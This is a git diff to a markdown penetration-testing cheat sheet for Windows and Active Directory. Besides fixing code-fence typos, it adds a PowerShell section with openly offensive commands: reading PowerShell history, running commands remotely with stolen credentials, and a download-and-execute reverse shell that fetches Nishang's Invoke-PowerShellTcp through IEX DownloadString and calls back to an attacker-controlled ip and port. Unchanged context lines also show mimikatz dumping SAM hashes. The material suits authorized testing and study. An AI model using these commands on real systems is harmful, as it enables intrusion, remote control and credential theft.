@@ -6,7 +6,7 @@ Windows
 
 More information [here](https://adsecurity.org/?p=1667)
 
-```powerhsell
+```powershell
 $ Import-Module ActiveDirectory
 $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'
 
@@ -69,7 +69,7 @@ foreach ($object in $objects) { $object }
 
 
 ### Collect AD users information
-```powerhsell
+```powershell
 # Helping functions
 function Get-ADUserDirectoryEntry($user) {
     return (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$user))")).FindOne().GetDirectoryEntry()
@@ -194,7 +194,7 @@ $ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 
 
 ### List Email aliases
-```bash
+```powershell
 $ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses
 ```
 
@@ -286,4 +286,47 @@ expand -f:* "%temp%\\update.msu\\update.cab" "%temp%\\update.msu\\update.cab"
 
 ```bash
 ldapsearch -h <host> -x -s base namingcontext
+```
+
+
+## PowerShell
+
+Some useful PowerShell commands that you can use during your recon or privsec phases.
+
+### Get PowerShell command history
+
+```powershell
+cd "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline"
+gc ConsoleHost_history.txt
+```
+
+
+### Execute block as an other user
+
+```powershell
+$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("<dom>\<username>", $pass)
+Invoke-Command -Computer <computer_name> -Credential $cred -ScriptBlock { cmd.exe "/c <cmd>" }
+```
+
+
+### Download and execute script
+
+The repository [Nishang](https://github.com/samratashok/nishang) contains a good
+PowerShell script to create a [reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
+You need to add the following line at the end:
+
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>
+```
+
+On your local machine:
+
+- You create an HTTP server to serve the script: `python -m http.serve`
+- You listen for an incoming [connection with nc](./reverse-shell.md).
+
+And on the remote host, you execute the following PowerShell script:
+
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
 ```
